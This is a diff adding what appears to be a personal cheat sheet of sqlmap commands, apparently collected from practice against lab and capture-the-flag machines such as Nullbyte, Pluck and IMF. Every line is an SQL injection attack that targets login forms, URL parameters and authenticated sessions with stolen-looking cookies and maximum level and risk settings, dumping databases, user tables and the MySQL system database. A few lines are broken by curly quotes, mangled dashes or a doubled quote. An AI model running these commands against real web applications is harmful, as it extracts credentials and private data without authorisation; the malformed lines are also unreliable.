@@ -1,0 +1,31 @@
+
+ sqlmap --url "http://nullbyte/kzMb5nVYJw/index.php" --data "usrtosearch=a" -D mysql --dump
+
+
+sqlmap --url "nullbyte/kzMb5nVYJw/420search.php?usrtosearch=a" --level=2 -D seth -T users --dump --exclude-sysdbs
+
+sqlmap -u http://192.168.0.108/login.php --data "user=abc&password=def&s=submit" --cookie PHPSESSID=2t5ncd6bdgpf1firgev29uebe3  --dump --level=5 --risk=3
+
+sqlmap.py --thread=10 --random-agent --url http://192.168.0.105 --data"usr=user*&pw=pw&commit=Login" -Tusers --dump --level=5 --risk=3
+
+sqlmap -u ‘http://192.168.2.14/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user&#8217; -p add_value -D jabcd0cs –dump
+
+sqlmap --url 192.168.0.107/imfadministaror/cms.php\?pagename\=home  --cookie "PHPSESSID=kosuhtlade3e0fnrtdf3j16bu5"  -D mysql --tables --dump --level=5 --risk=3
+sqlmap --url 192.168.0.107/imfadministrator/cms.php\?pagename\=home  --cookie "PHPSESSID=kosuhtlade3e0fnrtdf3j16bu5"   --dump --level=5 --risk=3
+
+sqlmap --url acid:33447/bin/l33t_haxor.php?id=  --cookie "sec_session_id=c7j85d7g4epfbuneg6r14n4v80"   --dump --level=5 --risk=3
+sqlmap -u ‘http://192.168.2.14/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user&#8217; -p add_value –current-db
+
+ sqlmap -v -u http://192.168.0.107/imfadministrator/cms.php\?pagename\=home --cookie "PHPSESSID=tbn4jch12210r7dc7pusdo9p16"  --dbs
+
+sqlmap -v -u http://192.168.0.107/imfadministrator/cms.php\?pagename\=home --cookie "PHPSESSID=tbn4jch12210r7dc7pusdo9p16" -D mysql --tables --dump --level=2 --risk=3
+
+
+
+sqlmap --url pluck/index.php?page=home --cookie "PHPSESSID=sr8884usm8oe6ik3rna9kutrs7" --level=2 -D mysql --tables --dump
+
+sqlmap --url ""pluck/admin.php" --data email=*&password=* --cookie "PHPSESSID=sr8884usm8oe6ik3rna9kutrs7" --level=2 -D mysql --tables --dump
+_____________Dump databases
+sqlmap --url "http://192.168.56.100/imfadministrator/cms.php?pagename="  --cookie "PHPSESSID=ljndf2p0tbeg0e4rcussv2p2q3" --level=2 --dbs
+_____________________dump tables
+sqlmap --url "http://192.168.56.100/imfadministrator/cms.php?pagename="  --cookie "PHPSESSID=ljndf2p0tbeg0e4rcussv2p2q3" --level=2 -D admin --tables --dump
